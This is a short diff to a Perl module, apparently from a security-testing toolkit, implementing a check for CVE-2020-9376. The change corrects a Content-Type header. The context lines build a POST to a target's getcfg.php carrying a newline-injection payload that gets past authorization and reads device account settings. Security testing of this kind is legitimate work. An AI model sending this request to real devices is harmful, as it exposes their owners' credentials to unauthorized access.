@@ -22,7 +22,7 @@ package Spellbook::Advisory::CVE_2020_9376 {
             }
 
             my $userAgent = Spellbook::Core::UserAgent -> new();
-            my $headers   = HTTP::Headers -> new ('Content-Type' => 'application/msx-www-form-urlencoded');
+            my $headers   = HTTP::Headers -> new ('Content-Type' => 'application/x-www-form-urlencoded');
             my $payload   = 'SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1';
             my $request   = HTTP::Request -> new('POST', "$target/getcfg.php", $headers, $payload);
             my $response  = $userAgent -> request($request);
